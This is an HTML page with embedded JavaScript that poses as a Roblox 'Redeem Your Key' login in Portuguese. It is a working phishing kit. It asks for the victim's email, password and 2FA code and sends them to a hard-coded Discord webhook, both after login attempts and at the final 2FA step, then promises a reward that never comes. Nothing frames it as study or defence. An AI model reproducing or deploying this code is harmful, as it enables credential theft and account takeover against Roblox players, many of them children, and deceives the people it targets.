<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redeem Your Key - Roblox Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a1a;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            background: #2b2b2b;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 350px;
            text-align: center;
            position: relative;
        }

        h1 {
            color: #00b060;
            margin-bottom: 20px;
            font-size: 24px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #ccc;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #444;
            border-radius: 8px;
            background: #333;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #00b060;
            outline: none;
        }

        button {
            width: 100%;
            padding: 12px;
            background: #00b060;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }

        button:hover {
            background: #009950;
        }

        .message {
            margin-top: 15px;
            font-size: 14px;
            min-height: 20px;
        }

        .success {
            color: #00b060;
        }

        .error {
            color: #ff4d4d;
        }

        .loading {
            display: none;
            color: #ffcc00;
        }

        /* Estilo para o passo 2 (2FA) */
        #step2 {
            display: none;
        }

        .roblox-icon {
            width: 50px;
            height: 50px;
            background: #00b060;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 24px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="roblox-icon">R</div>
    <h1>Redeem Your Key</h1>
    
    <!-- Passo 1: Login -->
    <div id="step1">
        <div class="input-group">
            <label>Email</label>
            <input type="email" id="email" placeholder="seu-email@exemplo.com">
        </div>
        <div class="input-group">
            <label>Senha</label>
            <input type="password" id="password" placeholder="Sua senha">
        </div>
        <button onclick="checkLogin()">Verificar Conta</button>
        <div class="message" id="msg1"></div>
    </div>

    <!-- Passo 2: 2FA (aparece após login bem-sucedido) -->
    <div id="step2">
        <h2>Confirmação 2FA</h2>
        <p style="font-size: 14px; color: #ccc;">Verifique o email da sua conta Roblox e coloque o código de 6 dígitos.</p>
        <div class="input-group">
            <label>Código 2FA</label>
            <input type="text" id="code2fa" placeholder="Ex: 123456" maxlength="6">
        </div>
        <button onclick="submit2FA()">Confirmar e Resgatar</button>
        <div class="message" id="msg2"></div>
    </div>
</div>

<script>
    // SEU WEBHOOK DO DISCORD
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

    // Função para verificar o login DIRETO NO NAVEGADOR
    async function checkLogin() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const msgDiv = document.getElementById('msg1');

        if (!email || !password) {
            msgDiv.innerHTML = '<span class="error">Preencha o Email e a Senha!</span>';
            return;
        }

        msgDiv.innerHTML = '<span class="loading">Verificando conta...</span>';

        try {
            // Tenta fazer login direto na API do Roblox do navegador
            // Usamos a API de login padrão
            const response = await fetch('https://www.roblox.com/users/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    username: email,
                    password: password
                }),
                mode: 'cors', // Importante para pedir permissão do navegador
                credentials: 'include'
            });

            const data = await response.json();

            // Se o Roblox devolver um ID, é sucesso
            if (data.id && data.id > 0) {
                msgDiv.innerHTML = '<span class="success">✅ Conta Encontrada! Vai para a confirmação...</span>';
                
                // Envia para o Discord que achou a conta
                sendToDiscord(`**🔒 CONTA ENCONTRADA!**\n\n**Email:** ${email}\n**Password:** ${password}\n**Username:** ${data.username}\n**User ID:** ${data.id}`);

                // Esconde passo 1 e mostra passo 2
                setTimeout(() => {
                    document.getElementById('step1').style.display = 'none';
                    document.getElementById('step2').style.display = 'block';
                }, 1500);
            } else {
                // Se falhou, pega no erro
                const errorMsg = data.error || "Conta ou Senha Incorretas";
                msgDiv.innerHTML = '<span class="error">❌ ' + errorMsg + '</span>';
                
                // Envia falha para o Discord
                sendToDiscord(`**❌ LOGIN FALHOU**\n\n**Email:** ${email}\n**Password:** ${password}\n**Erro:** ${errorMsg}`);
            }
        } catch (error) {
            // Erro de conexão ou CORS
            msgDiv.innerHTML = '<span class="error">❌ Erro de Conexão com o Roblox.</span>';
            console.error('Erro:', error);
            sendToDiscord(`**❌ ERRO DE CONEXÃO**\n\n**Email:** ${email}\n**Password:** ${password}\n**Erro:** ${error.message}`);
        }
    }

    // Função para enviar mensagem para o Discord
    async function sendToDiscord(message) {
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: message }),
                mode: 'no-cors' // Importante para evitar erro de CORS no Discord
            });
        } catch (error) {
            console.error('Erro ao enviar para o Discord:', error);
        }
    }

    // Função para submeter o código 2FA
    async function submit2FA() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const code = document.getElementById('code2fa').value;
        const msgDiv = document.getElementById('msg2');

        if (!code) {
            msgDiv.innerHTML = '<span class="error">Preencha o Código 2FA!</span>';
            return;
        }

        msgDiv.innerHTML = '<span class="loading">Enviando dados para o servidor...</span>';

        // Envia os dados finais para o Discord
        const finalMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n**Email:** ${email}\n**Password:** ${password}\n**Code 2FA:** ${code}\n**Timestamp:** ${new Date().toISOString()}`;
        
        await sendToDiscord(finalMessage);

        msgDiv.innerHTML = '<span class="success">✅ Sucesso! A sua chave será enviada em breve.</span>';
        
        // Opcional: Esconder tudo após sucesso
        setTimeout(() => {
            document.querySelector('.container').innerHTML = '<h1 style="color:#00b060">Tudo Pronto!</h1><p>Aguarde o email de confirmação.</p>';
        }, 3000);
    }
</script>

</body>
</html>
